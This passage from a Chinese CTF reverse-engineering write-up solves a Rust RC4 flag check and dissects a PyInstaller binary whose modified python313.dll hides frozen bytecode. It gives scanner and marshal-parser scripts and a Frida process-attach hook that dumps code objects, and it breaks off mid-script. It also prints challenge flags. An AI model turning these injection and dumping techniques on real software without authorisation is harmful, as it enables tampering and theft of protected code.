    0x0000000000000017, 0x000000000000000A, 0x0000000000000015, 0x0000000000000008, 
    0x0000000000000013, 0x0000000000000006, 0x0000000000000011, 0x0000000000000004, 
    0x000000000000000F, 0x0000000000000002, 0x000000000000000D, 0x0000000000000000, 
    0x000000000000000B, 0x0000000000000016, 0x0000000000000009, 0x0000000000000014, 
    0x0000000000000007, 0x0000000000000012, 0x0000000000000005, 0x0000000000000010
};
```

后续使用 key 初始化 s_1 派生密钥，并使用构建好的索引对 key 做变换。

`qword_9BED` 应该就是密文，`sub_17650` 就是最后的加密函数。

![](https://img.halfcity.top/2026/11/10/d02c68cd52e243dacfbf3031841920af.png)

函数很复杂，但是我们注意到了大量的 n0x100 和 ` _BYTE sa[256]; // [rsp+A8h] [rbp-170h] BYREF` 以及 `  memset(s: sa, c: 0, n: sizeof(sa))`。

这个是 RC4 的 SBOX 的特征。

猜测可能是 RC4 加密。

大致流程如下：

```rust
fn check(input: &str) -> bool {
    if input.len() != 30 { return false; }
    if !input.starts_with("flag{") { return false; }
    if input.as_bytes()[29] != b'}' { return false; }

    let mut s = [0u8; 24];

    // 按 dest 表从 input[5..29] 中取 24 个字符
    for i in 0..24 {
        let idx = dest[i] + 5;
        if idx < 5 || idx >= 30 { panic!(); }
        s[i] = input.as_bytes()[idx];
    }

    // 生成 8 字节密钥
    let mut key = [0u8; 8];
    for i in 0..8 {
        let a = bytes_of(0x2179654B74735572)[i]; // "rUstKey!"
        let b = bytes_of(0x30626E344D743463)[i]; // "c4tM4nb0"
        key[i] = b ^ a;
    }

    rc4(&mut s, &key);

    s == target
}
```

解密脚本如下：

```py
src = [
    0x03, 0x0E, 0x01, 0x0C,
    0x17, 0x0A, 0x15, 0x08,
    0x13, 0x06, 0x11, 0x04,
    0x0F, 0x02, 0x0D, 0x00,
    0x0B, 0x16, 0x09, 0x14,
    0x07, 0x12, 0x05, 0x10,
]

target = bytes([
    0xE9, 0xA8, 0x79, 0x7B, 0xC5, 0x32, 0xD9, 0xDA,
    0x26, 0xFA, 0x31, 0x90, 0x4C, 0xBE, 0x96, 0x6F,
    0x1C, 0x93, 0xB8, 0x42, 0x70, 0x9D, 0xE2, 0x8C,
])

key = bytes([
    0x11, 0x61, 0x07, 0x39,
    0x7F, 0x0B, 0x1B, 0x11,
])

def rc4(data: bytes, key: bytes) -> bytes:
    S = list(range(256))
    j = 0

    # KSA
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]

    # PRGA
    i = 0
    j = 0
    out = bytearray()

    for c in data:
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        k = S[(S[i] + S[j]) & 0xFF]
        out.append(c ^ k)

    return bytes(out)

t = rc4(target, key)

# body[src[i]] = t[i]
body = bytearray(24)
for i, idx in enumerate(src):
    body[idx] = t[i]

flag = b"flag{" + bytes(body) + b"}"
print(flag.decode())
```

输出如下：

```txt
> python rusty.py
flag{rewr1te_it_in_rust_now!!}
```

```txt
flag{rewr1te_it_in_rust_now!!}
```

### 空空の蛇

#### 静态分析

![](https://img.halfcity.top/2026/11/10/d7457af4858bbe773d1acb9741b7ec91.png)

查壳发现是 pyinstaller 打包的。

我们先解包：

```txt
> pyinstxtractor-ng frozenwhisper.exe
[+] Processing frozenwhisper.exe
[+] Pyinstaller version: 2.1+
[+] Python version: 3.13
[+] Length of package: 7696660 bytes
[+] Found 64 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: main.pyc
[+] Found 112 files in PYZ archive
[+] Successfully extracted pyinstaller archive: frozenwhisper.exe

You can now use a python decompiler on the pyc files within the extracted directory
```

然后反编译一下 pyc 文件：

![](https://img.halfcity.top/2026/11/10/4d507ddc314ede938e62fc85a5f4d4d1.png)

这里出现了很奇怪的现象，主程序一运行就自己退出？

然而实测这里依旧会提示我输入 flag 并检验，所以这肯定隐藏了什么逻辑：

```txt
> frozenwhisper.exe
Input flag: asd
Wrong
```

```py
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: 'pyiboot01_bootstrap.py'
# Bytecode version: 3.13.0rc3 (3571)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import sys
import pyimod02_importers
pyimod02_importers.install()
import os
if not hasattr(sys, 'frozen'):
    sys.frozen = True
sys.prefix = sys._MEIPASS
sys.exec_prefix = sys.prefix
sys.base_prefix = sys.prefix
sys.base_exec_prefix = sys.exec_prefix
VIRTENV = 'VIRTUAL_ENV'
if VIRTENV in os.environ:
    os.environ[VIRTENV] = ''
    del os.environ[VIRTENV]
python_path = []
for pth in sys.path:
    python_path.append(os.path.abspath(pth))
    sys.path = python_path
try:
    import encodings
except ImportError:
    pass
if sys.warnoptions:
    import warnings
import pyimod03_ctypes
pyimod03_ctypes.install()
if sys.platform.startswith('win'):
    import pyimod04_pywin32
    pyimod04_pywin32.install()
for entry in os.listdir(sys._MEIPASS):
    entry = os.path.join(sys._MEIPASS, entry)
    if os.path.isdir(entry) and entry.endswith('.egg'):
            sys.path.append(entry)
```

启动流程似乎也没有什么问题，这样找下去感觉不太行，既然有输入提示的字符串我们可以尝试直接去找找。

如果没有加密的话应该就可以定位到有问题的文件。

![](https://img.halfcity.top/2026/11/10/711ef44f10c255c8578a5ec36c89f3aa.png)

很惊讶竟然是在 `python313.dll` 里面，所以这里似乎是 pyinstaller 内嵌的解释器被魔改了，向里面嵌入了异常的字节码。

这里似乎就是字节码所在的位置，同时名字似乎就叫 `_fwh_main`。

![](https://img.halfcity.top/2026/11/10/6a1298532061bcc920778f6b5e2b2386.png)

IDA 无法加载符号文件，所以这里的文件 hash 无法匹配任何的 python 解释器版本，完全肯定了这个解释器被修改过。

![](https://img.halfcity.top/2026/11/10/ab836f843b3cbf795b65f7fbdacdf66f.png)

定位到目标字符串。

这应该是一个 Frozen 模块。

![](https://img.halfcity.top/2026/11/10/d2050e030af458ce70d3e8ede61644ca.png)

找到附近可能的 `cb_object` 结构：

```py
import ida_bytes

anchor = 0x1804A846B
for ea in range(anchor, anchor - 0x400, -1):
    b = ida_bytes.get_byte(ea)
    if b in (0x63, 0xE3):
        print(f"candidate TYPE_CODE at 0x{ea:X}")
```

输出如下：

```txt
candidate TYPE_CODE at 0x1804A83C1
candidate TYPE_CODE at 0x1804A8316
candidate TYPE_CODE at 0x1804A8313
candidate TYPE_CODE at 0x1804A82E7
candidate TYPE_CODE at 0x1804A82C2
candidate TYPE_CODE at 0x1804A82BC
candidate TYPE_CODE at 0x1804A8296
candidate TYPE_CODE at 0x1804A816C
candidate TYPE_CODE at 0x1804A8109
candidate TYPE_CODE at 0x1804A8105
candidate TYPE_CODE at 0x1804A8100
candidate TYPE_CODE at 0x1804A80B6
candidate TYPE_CODE at 0x1804A80AB
candidate TYPE_CODE at 0x1804A8095
candidate TYPE_CODE at 0x1804A807E
```

`0x1804A83C1` 应该就是目标了，尝试转储结构并提取字节码：

```py
import ida_bytes

START = 0x1804A83C1
SIZE  = 0x400
OUT   = r"D:\data\blog\ctf\spark_2026\resources\week4\fwh_main.bin"

data = bytearray()
for i in range(SIZE):
    data.append(ida_bytes.get_byte(START + i))

with open(OUT, "wb") as f:
    f.write(data)

print(f"[+] dumped {len(data)} bytes from 0x{START:X} to {OUT}")
print("[+] first 32 bytes:", data[:32].hex())
```

```txt
[+] dumped 1024 bytes from 0x1804A83C1 to D:\data\blog\ctf\spark_2026\resources\week4\fwh_main.bin
[+] first 32 bytes: 630000000000000000000000000500000003000000f39000000095001e005b01
```

我本地的 cpython 是 3.14 的，这里我将下载一个 3.13 的版本：

```txt
> uv python install 3.13.0rc3
Installed Python 3.13.0rc3 in 18.45s
 + cpython-3.13.0rc3-windows-x86_64-none (python3.13.exe)
```

不过这里似乎有点问题无法解析，观察发现应该是 co_code 被出题人魔改了，我们可以自己解析一下：

**`co_consts`（常量池）**
位于 `0x1804A846B` 开始的元组，长度 5：

```
0x1804A846B: 29 05          ; TYPE_SMALL_TUPLE, 5 elements
0x1804A846D: 4E             ; None
0x1804A846E: 7A 0C          ; "Input flag: "
0x1804A847C: DA 00          ; ""
0x1804A847E: DA 07          ; "Correct"
0x1804A8487: DA 05          ; "Wrong"
```

**`co_names`（全局名称）**
位于 `0x1804A848E` 开始的元组，长度 5：

```
0x1804A848E: 29 05          ; TYPE_SMALL_TUPLE, 5 elements
0x1804A8490: DA 05          ; "input"
0x1804A8497: DA 08          ; "EOFError"
0x1804A84A1: DA 11          ; "KeyboardInterrupt"
0x1804A84B4: DA 05          ; "print"
```

**`co_varnames`（局部变量）**
位于 `0x1804A84BC` 开始的元组，长度 1：

```
0x1804A84BC: F0 01 00 00 00  	; TYPE_REF
0x1804A84C1: 29 01          	; TYPE_SMALL_TUPLE, 1 element
0x1804A84C2: 72 88 01 00 00 00	; TYPE_REF, 指向之前的某个对象
```

**`co_name` 与 `co_qualname`**

```
0x1804A84D2: DA 09          ; co_name = "_fwh_main"
0x1804A84EB: 80 00 F0 02 03 05 12 DC 0F 14 90 5E D3 0F 24 88 04 F4 06 00 05 0A 94 7A A0 24 D7 17 27 D1 17 27 88 29 D5 04 35 A8 57 D5 04 35 F8 F4 05 00 0D 15 D4 16 27 D0 0B 28 F3 00 01 05 12 D8 0F 11 8A 04 F0 03 01 05 12 FA 73 0F 00 00 00 82 0B 30 00 B0 12 41 05 03 C1 04 01 41 05 03 DA 08 "_MEIPASS"
```

但是这里无法直接调用 `marshal.loads` 加载，也许是被魔改了？

根据函数的命名方式推测，发现还能找到一些别的 Frozen 模块。

![](https://img.halfcity.top/2026/11/10/07cdfcfd55f1c0bcaa1ecd330cf00750.png)

我们批量提取出来：

```py
import sys
import pefile

DLL = sys.argv[1] if len(sys.argv) > 1 else "python313.dll"
PREFIX = "_fwh_"

def is_printable_ascii(b):
    return all(0x20 <= c < 0x7F for c in b)

def main():
    pe = pefile.PE(DLL)

    for s in pe.sections:
        sec_name = s.Name.rstrip(b'\x00').decode('ascii', errors='replace')
        if sec_name != '.rdata':
            continue
        rva_base = s.VirtualAddress
        data = s.get_data()
        print(f"[*] .rdata RVA=0x{rva_base:X} size=0x{len(data):X}")

        count = 0
        i = 0
        while i < len(data) - 2:
            b0 = data[i]
            if b0 in (0xDA, 0x7A):
                length = data[i + 1]
                if 1 <= length <= 0x40 and i + 2 + length <= len(data):
                    payload = data[i + 2:i + 2 + length]
                    if is_printable_ascii(payload):
                        try:
                            text = payload.decode('ascii')
                        except Exception:
                            i += 1
                            continue
                        if text.startswith(PREFIX):
                            rva = rva_base + i
                            print(f"0x{rva:010X}  0x{b0:02X}  len={length:02d}  {text!r}")
                            count += 1
                        i += 2 + length
                        continue
            i += 1

        print(f"\n[*] total _fwh_ entries: {count}")

if __name__ == "__main__":
    main()
```

发现他们确实都可以被找到，同时也都是合法的 marshal 字符串：

```txt
> python scan.py
[*] .rdata RVA=0x376000 size=0x25E200
0x00004A82A5  0xDA  len=11  '_fwh_length'
0x00004A82D2  0xDA  len=08  '_fwh_key'
0x00004A82DC  0xDA  len=13  '_fwh_expected'
0x00004A830C  0xDA  len=10  '_fwh_check'
0x00004A84D2  0xDA  len=09  '_fwh_main'

[*] total _fwh_ entries: 5
```

我们需要写一个自定义的解析器来对 co_object 进行分析。

因为我们需要对无法解析的应用标注  REF 而不是提示解析失败：

```py
import sys
import pefile

FLAG_REF = 0x80
T_NULL=ord('0'); T_NONE=ord('N'); T_FALSE=ord('F'); T_TRUE=ord('T')
T_STOPITER=ord('S'); T_ELLIPSIS=ord('.')
T_INT=ord('i'); T_INT64=ord('I'); T_BINARY_FLOAT=ord('g')
T_LONG=ord('l'); T_STRING=ord('s'); T_INTERNED=ord('t')
T_REF=ord('r'); T_TUPLE=ord('('); T_SMALL_TUPLE=ord(')')
T_CODE=ord('c'); T_UNICODE=ord('u')
T_ASCII=ord('a'); T_ASCII_INTERNED=ord('A')
T_SMALL_ASCII=ord('z'); T_SMALL_ASCII_INTERNED=ord('Z')
T_DICT=ord('{'); T_LIST=ord('[')

class REF:
    def __init__(self, idx): self.idx = idx
    def __repr__(self): return f"REF({self.idx})"

class Parser:
    def __init__(self, data, base_rva=0):
        self.data = data
        self.pos = 0
        self.base = base_rva
        self.refs = []

    def off(self): return self.base + self.pos

    def rb(self):
        if self.pos >= len(self.data):
            raise ValueError(f"eof @ 0x{self.off():X}")
        v = self.data[self.pos]; self.pos += 1; return v

    def rbytes(self, n):
        if self.pos + n > len(self.data):
            raise ValueError(f"eof @ 0x{self.off():X}")
        v = self.data[self.pos:self.pos+n]; self.pos += n; return v

    def ru32(self): return int.from_bytes(self.rbytes(4), 'little')
    def ri32(self): return int.from_bytes(self.rbytes(4), 'little', signed=True)
    def ri64(self): return int.from_bytes(self.rbytes(8), 'little', signed=True)

    def obj(self, depth=0):
        if depth > 64: raise ValueError(f"depth @ 0x{self.off():X}")
        t = self.rb()
        flag = t & FLAG_REF
        t &= ~FLAG_REF
        v = self._obj(t, depth)
        if flag: self.refs.append(v)
        return v

    def _obj(self, t, depth):
        if t in (T_NULL, T_NONE): return None
        if t == T_FALSE: return False
        if t == T_TRUE: return True
        if t == T_STOPITER: return StopIteration
        if t == T_ELLIPSIS: return Ellipsis
        if t == T_INT: return self.ri32()
        if t == T_INT64: return self.ri64()
        if t == T_BINARY_FLOAT:
            import struct
            return struct.unpack('<d', self.rbytes(8))[0]
        if t == T_LONG:
            n = self.ri32(); sign = -1 if n < 0 else 1
            v = 0
            for i in range(abs(n)):
                v |= int.from_bytes(self.rbytes(2), 'little') << (15*i)
            return sign * v
        if t in (T_STRING, T_INTERNED):
            n = self.ru32(); return self.rbytes(n)
        if t == T_UNICODE:
            n = self.ru32(); return self.rbytes(n).decode('utf-8', errors='replace')
        if t in (T_ASCII, T_ASCII_INTERNED):
            n = self.ru32(); return self.rbytes(n).decode('ascii', errors='replace')
        if t in (T_SMALL_ASCII, T_SMALL_ASCII_INTERNED):
            n = self.rb(); return self.rbytes(n).decode('ascii', errors='replace')
        if t == T_TUPLE:
            n = self.ru32(); return tuple(self.obj(depth+1) for _ in range(n))
        if t == T_SMALL_TUPLE:
            n = self.rb(); return tuple(self.obj(depth+1) for _ in range(n))
        if t == T_LIST:
            n = self.ru32(); return [self.obj(depth+1) for _ in range(n)]
        if t == T_DICT:
            d = {}
            while True:
                k = self.obj(depth+1)
                if k is None: break
                v = self.obj(depth+1)
                d[k] = v
            return d
        if t == T_REF:
            idx = self.ri32()
            if idx < len(self.refs): return self.refs[idx]
            return REF(idx)  # 容错
        if t == T_CODE:
            return self._code(depth)
        raise ValueError(f"unknown 0x{t:02X} @ 0x{self.off()-1:X}")

    def _code(self, depth):
        co = {'_start': self.off() - 1}
        co['argcount'] = self.ri32()
        co['posonly'] = self.ri32()
        co['kwonly'] = self.ri32()
        co['nlocalsplus'] = self.ri32()
        co['framesize'] = self.ri32()
        co['flags'] = self.ri32()
        co['co_code'] = self.obj(depth+1)
        co['co_consts'] = self.obj(depth+1)
        co['co_names'] = self.obj(depth+1)
        co['co_localsplusnames'] = self.obj(depth+1)
        co['co_localspluskinds'] = self.obj(depth+1)
        co['co_filename'] = self.obj(depth+1)
        co['co_name'] = self.obj(depth+1)
        co['co_qualname'] = self.obj(depth+1)
        co['co_firstlineno'] = self.ri32()
        co['co_linetable'] = self.obj(depth+1)
        co['co_exceptiontable'] = self.obj(depth+1)
        return co


def find_anchor(pe, co_name_rva, expected_name, max_back=0x400):
    """从 co_name_rva 往前扫描 29/28 元组头，验证 name 字段起点是否 == co_name_rva"""
    off_name = pe.get_offset_from_rva(co_name_rva)
    start_off = max(0, off_name - max_back)
    end_off = min(len(pe.__data__), off_name + 0x100)
    data = pe.__data__[start_off:end_off]
    base_rva = pe.get_rva_from_offset(start_off)
    rel_name = off_name - start_off

    for i in range(rel_name):
        if data[i] not in (T_SMALL_TUPLE, T_TUPLE):
            continue
        p = Parser(data, base_rva=base_rva)
        p.pos = i
        field_rvas = []

        def f():
            field_rvas.append(p.off())
            return p.obj()

        try:
            consts = f()
            names = f()
            varnames = f()
            kinds = f()
            filename = f()
            name = f()
            qualname = f()
            firstlineno = p.ri32()
            linetable = f()
            exceptiontable = f()
        except Exception:
            continue

        if field_rvas[5] == co_name_rva and name == expected_name:
            return {
                'anchor_rva': base_rva + i,
                'consts': consts,
                'names': names,
                'varnames': varnames,
                'kinds': kinds,
                'filename': filename,
                'name': name,
                'qualname': qualname,
                'firstlineno': firstlineno,
                'linetable': linetable,
                'exceptiontable': exceptiontable,
                'field_rvas': field_rvas,
            }
    return None


def fmt(v, indent=0):
    if isinstance(v, bytes):
        try:
            s = v.decode('ascii')
            if s.isprintable() and all(0x20 <= ord(c) < 0x7F for c in s):
                return f"b{s!r}"
        except Exception:
            pass
        return f"bytes({v.hex()})"
    if isinstance(v, tuple):
        if not v: return "()"
        pad = "  " * indent
        return "(\n" + ",\n".join(pad + "  " + fmt(x, indent+1) for x in v) + "\n" + pad + ")"
    return repr(v)


def dump_result(name_rva, result):
    print(f"\n{'='*64}")
    print(f"anchor @ RVA 0x{result['anchor_rva']:X}  name @ 0x{name_rva:X}")
    print(f"{'='*64}")
    for k in ('consts', 'names', 'varnames', 'kinds',
              'filename', 'name', 'qualname'):
        print(f"\n{k}:")
        print("  " + fmt(result[k], 1).replace("\n", "\n  "))
    print(f"\nfirstlineno: {result['firstlineno']}")
    print(f"linetable: {fmt(result['linetable'])}")
    print(f"exceptiontable: {fmt(result['exceptiontable'])}")
    print(f"\nfield_rvas: {[hex(x) for x in result['field_rvas']]}")


def main():
    DLL = sys.argv[1] if len(sys.argv) > 1 else "python313.dll"
    pe = pefile.PE(DLL)

    targets = [
        ("_fwh_check", 0x4A830C),
        ("_fwh_main",  0x4A84D2),
    ]

    for name, name_rva in targets:
        print(f"\n[*] searching anchor for {name!r} @ 0x{name_rva:X} ...")
        result = find_anchor(pe, name_rva, name)
        if result:
            dump_result(name_rva, result)
        else:
            print(f"[!] no anchor found for {name!r}")


if __name__ == "__main__":
    main()
```

输出如下：

```txt
> python parse.py

[*] searching anchor for '_fwh_check' @ 0x4A830C ...

================================================================
anchor @ RVA 0x4A828E  name @ 0x4A830C
================================================================

consts:
  (
      None,
      False,
      'ascii',
      REF(1)
    )

names:
  (
      REF(277),
      '_fwh_length',
      REF(324),
      'UnicodeEncodeError',
      'range',
      '_fwh_key',
      '_fwh_expected'
    )

varnames:
  (
      's',
      REF(255),
      'diff',
      'i'
    )

kinds:
  b'    '

filename:
  REF(24)

name:
  '_fwh_check'

qualname:
  REF(496)

firstlineno: 1190
linetable: bytes(8000dc070a88318376941bd3071cd80f14f002030515d80f108f7889789807d30f208804f006000c0d8044dc0d12943390749339d60d1d8801d8080c906191179c38a041ac03ac48ab0dd12435d11b36d11136bc2dc801d13a4ad1104ad1084a8a04f103000e1ee00b0f90318939d00414f8f40b000c1ef300010515d90f14f003010515fa)
exceptiontable: bytes(9611413400c1340a420103c20001420103)

field_rvas: ['0x4a828e', '0x4a829e', '0x4a82eb', '0x4a82fe', '0x4a8307', '0x4a830c', '0x4a8318', '0x4a8321', '0x4a83ab']

[*] searching anchor for '_fwh_main' @ 0x4A84D2 ...

================================================================
anchor @ RVA 0x4A846B  name @ 0x4A84D2
================================================================

consts:
  (
      None,
      'Input flag: ',
      '',
      'Correct',
      'Wrong'
    )

names:
  (
      'input',
      'EOFError',
      'KeyboardInterrupt',
      'print',
      REF(496)
    )

varnames:
  (
      REF(392)
    )

kinds:
  b' '

filename:
  REF(24)

name:
  '_fwh_main'

qualname:
  REF(505)

firstlineno: 1202
linetable: bytes(8000f002030512dc0f14905ed30f248804f40600050a947aa024d71727d117278829d50435a857d50435f8f405000d15d41627d00b28f300010512d80f118a04f003010512fa)
exceptiontable: bytes(820b3000b012410503c10401410503)

field_rvas: ['0x4a846b', '0x4a848e', '0x4a84c0', '0x4a84c7', '0x4a84cd', '0x4a84d2', '0x4a84dd', '0x4a84e6', '0x4a8531']
```

这里成功解析了 `_fwh_main` 和 `_fwh_check` 这两个 co_object。

但是这里还有 `_fwh_expected` `_fwh_key` ` _fwh_length` 没有被找到：

```txt
0x00004A82A5  0xDA  len=11  '_fwh_length'
0x00004A82D2  0xDA  len=08  '_fwh_key'
0x00004A82DC  0xDA  len=13  '_fwh_expected'
0x00004A830C  0xDA  len=10  '_fwh_check'
0x00004A84D2  0xDA  len=09  '_fwh_main'
```

猜测他们应该是全局变量，并且定义在父模块的 co_consts 里面。

让我们先找找都有哪些 frozen 模块：

```py
import sys
import pefile

DLL = "python313.dll"
pe = pefile.PE(DLL)

results = []
for s in pe.sections:
    if s.Name.rstrip(b'\x00').decode('ascii', 'replace') != '.rdata':
        continue
    rva_base = s.VirtualAddress
    data = s.get_data()
    i = 0
    while i < len(data) - 2:
        b0 = data[i]
        if b0 in (0x7A, 0xDA):
            length = data[i+1]
            if 1 <= length <= 0x40 and i + 2 + length <= len(data):
                payload = data[i+2:i+2+length]
                try:
                    text = payload.decode('ascii')
                    if text.startswith("<frozen ") and text.endswith(">"):
                        results.append((rva_base + i, b0, text))
                except Exception:
                    pass
        i += 1

results.sort(key=lambda x: x[0])
print(f"[*] found {len(results)} <frozen ...> strings\n")
print(f"{'RVA':>12}  {'tag':>4}  text")
print("-" * 80)
for rva, tag, text in results:
    print(f"0x{rva:010X}  0x{tag:02X}  {text}")
```

输出如下：

```txt
> python modules.py
[*] found 24 <frozen ...> strings

         RVA   tag  text
--------------------------------------------------------------------------------
0x0000378EA8  0xDA  <frozen getpath>
0x000048B214  0xDA  <frozen importlib._bootstrap>
0x0000499061  0xDA  <frozen importlib.machinery>
0x00004991CD  0xDA  <frozen __phello__.ham>
0x00004997D3  0xDA  <frozen posixpath>
0x000049E8F4  0xDA  <frozen os>
0x00004A90E7  0xDA  <frozen _sitebuiltins>
0x00004AA632  0xDA  <frozen importlib.util>
0x00004AD20C  0xDA  <frozen __phello__>
0x00004AD58C  0xDA  <frozen genericpath>
0x00004AF511  0xDA  <frozen ntpath>
0x00004B649E  0xDA  <frozen codecs>
0x00004C061C  0xDA  <frozen io>
0x00004C0B8D  0xDA  <frozen __phello__.ham.eggs>
0x00004C1243  0xDA  <frozen importlib._bootstrap_external>
0x00004D0A4C  0xDA  <frozen __phello__.spam>
0x00004D0FB0  0xDA  <frozen zipimport>
0x00004D76DE  0xDA  <frozen runpy>
0x00004DB5D3  0xDA  <frozen _collections_abc>
0x00004E6487  0xDA  <frozen stat>
0x00004E76D1  0xDA  <frozen frozen_only>
0x00004E7AC7  0xDA  <frozen abc>
0x00004E9729  0xDA  <frozen __hello__>
0x00004EA7CF  0xDA  <frozen site>
```

注意到这两行：

```txt
0x000049E8F4  0xDA  <frozen os>
0x00004A90E7  0xDA  <frozen _sitebuiltins>
```

`<frozen os>` 的 RVA 是 0x000049E8F4 而 `<frozen _sitebuiltins>` 的 RVA 是 0x00004A90E7。

比对一下之前的发现：

```txt
_fwh_check:
anchor @ RVA 0x4A828E  name @ 0x4A830C
_fwh_main:
anchor @ RVA 0x4A846B  name @ 0x4A84D2
```

可以看到 `_fwh_check` 和 `_fwh_main` 都落在了 `<frozen os>` 内部。

因此 `<frozen os>` 可能就是他们的父模块，这和看雪的[这篇文章](https://bbs.kanxue.com/thread-292776.htm)很像，同时这也能解释 `_fwh_main` 是如何加载的。

os 模块一定在初始化的时候被加载使用。

此时分析到这里的时候我看着这些导出的 Py 函数，总感觉有一股眼熟的感觉，似乎在哪里见过。仔细一想，这不就是 il2cpp 的导出命令方式吗？

所以我们很容易就可以猜测到这里的 python311.dll 其实就类似 libil2cpp.dll 这样的后端。

它自身维护一个 runtime 并导出 api 供前端调用。

很好现在我有了先前可以参考的经验接下来就比较好办了。

思考意思我们其实可以直接 call 这个 dll 导出的函数来访问 runtime 的数据，无论静态的结构如何魔改，运行时一定都会回归到归一的结构。

由于我们不需要像和 il2cpp 交互那样需要频繁询问数据，这里就不需要注入 dll 了，简单写一个 frida 脚本即可。

#### 动态分析

我们现在需要校验的逻辑以及密钥和密文。

pyinstaller 打包的程序会在运行时释放内部依赖到临时目录并新开进程，我们需要检测 python313.dll 加载的那一个并attach。

服务端的脚本如下，检测真实进程并注入 frida 脚本，最后写回 pyc 文件：

```py
import frida
import time
import os
import struct
import marshal

DLL = "python313.dll"
JS_PATH = "fwh_dump.js"
OUT_DIR = "dumped_code_objects"

PY313_MAGIC = b'\xf3\x0d\x0d\x0a'

def build_pyc_header(magic=PY313_MAGIC, mtime=0, source_size=0):
    return (magic
            + struct.pack('<I', 0)
            + struct.pack('<I', mtime)
            + struct.pack('<I', source_size))

def on_message(msg, data):
    if msg["type"] == "send":
        payload = msg.get("payload", {})
        if payload.get("type") == "code_object":
            name = payload.get("name", "unknown").replace("/", "_").replace("@", "_at_")
            size = int(payload.get("size", 0))
            os.makedirs(OUT_DIR, exist_ok=True)

            marshal_data = bytes(data)

            header = build_pyc_header()
            pyc_path = os.path.join(OUT_DIR, f"{name}.pyc")
            with open(pyc_path, "wb") as f:
                f.write(header)
                f.write(marshal_data)

            verify = ""
            try:
                code = marshal.loads(marshal_data)
                verify = f" | co_name={code.co_name!r}, co_code_len={len(code.co_code)}"
            except Exception as e:
                verify = f" | [verify failed: {e}]"

            print(f"[+] saved {pyc_path} ({size + 16} bytes){verify}")
        else:
            print(f"[JS] {payload.get('m', '')}")
    elif msg["type"] == "error":
        print(f"[ERR] {msg.get('description')}")
    elif msg["type"] == "log":
        print(f"[LOG] {msg['payload']}")

def find_target():
    device = frida.get_local_device()
    for p in device.enumerate_processes():
        if "frozenwhisper" not in p.name.lower():
            continue
        try:
            session = device.attach(p.pid)
            res = {}
            script = session.create_script(f"""
                var m = Process.findModuleByName("{DLL}");
                send({{found: !!m, base: m ? m.base.toString() : null}});
            """)
            script.on("message", lambda msg, data: res.update(msg["payload"]))
            script.load()
            session.detach()
            if res.get("found"):
                return p.pid, res.get("base")
        except Exception:
            continue
    return None, None

def main():
    print("[*] wating for frozenwhisper.exe")
    pid = None
    for _ in range(300):
        pid, base = find_target()
        if pid:
            break
        time.sleep(0.1)
    if not pid:
        print("[-] python313.dll not found")
        return

    print(f"[+] target pid={pid}  {DLL} base={base}")
    session = frida.attach(pid)
    with open(JS_PATH, encoding="utf-8") as f:
        js = f.read()
    script = session.create_script(js)
    script.on("message", on_message)
    script.load()
    print("[+] script loaded")
    input("[*] press Enter to quit\n")

if __name__ == "__main__":
    main()
```

frida 脚本如下，动态查找导出函数，先获取 GIL，随后调用 API 来转储运行时的数据：

```js
var DLL = "python313.dll";
var done = false;
var gotFlag = false;

function log(s) { try { send({ m: String(s) }); } catch (e) { } }

function tryInstall() {
    if (done) return;
    try {
        var mod = Process.findModuleByName(DLL);
        if (!mod) return;

        var pIsInit = mod.findExportByName("Py_IsInitialized");
        var pGILE = mod.findExportByName("PyGILState_Ensure");
        var pGILR = mod.findExportByName("PyGILState_Release");
        var pImportAdd = mod.findExportByName("PyImport_AddModule");
        var pImportMod = mod.findExportByName("PyImport_ImportModule");
        var pGetDict = mod.findExportByName("PyModule_GetDict");
        var pDictGet = mod.findExportByName("PyDict_GetItemString");
        var pGetAttr = mod.findExportByName("PyObject_GetAttrString");
        var pBytes = mod.findExportByName("PyBytes_AsStringAndSize");
        var pTupleSize = mod.findExportByName("PyTuple_Size");
        var pTupleGet = mod.findExportByName("PyTuple_GetItem");
        var pErrClear = mod.findExportByName("PyErr_Clear");
        var pCallFn = mod.findExportByName("PyObject_CallFunctionObjArgs");

        if (!pIsInit || !pGILE || !pGILR || !pImportAdd || !pGetDict ||
            !pDictGet || !pGetAttr || !pBytes) {
            log("[-] missing exports"); done = true; return;
        }

        var IsInit = new NativeFunction(pIsInit, "int", []);
        var GILE = new NativeFunction(pGILE, "int", []);
        var GILR = new NativeFunction(pGILR, "void", ["int"]);
        var ImportAdd = new NativeFunction(pImportAdd, "pointer", ["pointer"]);
        var ImportMod = pImportMod
            ? new NativeFunction(pImportMod, "pointer", ["pointer"]) : null;
        var GetDict = new NativeFunction(pGetDict, "pointer", ["pointer"]);
        var DictGet = new NativeFunction(pDictGet, "pointer", ["pointer", "pointer"]);
        var GetAttr = new NativeFunction(pGetAttr, "pointer", ["pointer", "pointer"]);
        var Bytes = new NativeFunction(pBytes, "int", ["pointer", "pointer", "pointer"]);
        var TupleSize = pTupleSize
            ? new NativeFunction(pTupleSize, "int64", ["pointer"]) : null;
        var TupleGet = pTupleGet
            ? new NativeFunction(pTupleGet, "pointer", ["pointer", "int64"]) : null;
        var Clear = pErrClear ? new NativeFunction(pErrClear, "void", []) : function () { };
        var CallFn = pCallFn
            ? new NativeFunction(pCallFn, "pointer",
                ["pointer", "pointer", "pointer", "pointer", "pointer", "pointer"]) : null;

        if (IsInit() === 0) return;
        done = true;
        log("module base = " + mod.base);

        function getBytes(obj) {
            try {
                Clear();
                var buf = Memory.alloc(Process.pointerSize);
                var len = Memory.alloc(8);
                if (Bytes(obj, buf, len) !== 0) { Clear(); return null; }
                var ptr = buf.readPointer();
                var n = len.readS64();
                if (!ptr || ptr.isNull() || n < 0 || n > 0x100000) return null;
                if (n === 0) return { bytes: new Uint8Array(0), len: 0, hex: "" };
                var arr = new Uint8Array(ptr.readByteArray(n));
                var hex = '';
                for (var i = 0; i < arr.length; i++)
                    hex += ('0' + arr[i].toString(16)).slice(-2);
                return { bytes: arr, len: n, hex: hex };
            } catch (e) { Clear(); return null; }
        }

        function getStr(obj) {
            try {
                Clear();
                var pUtf8 = mod.findExportByName("PyUnicode_AsUTF8");
                if (!pUtf8) return null;
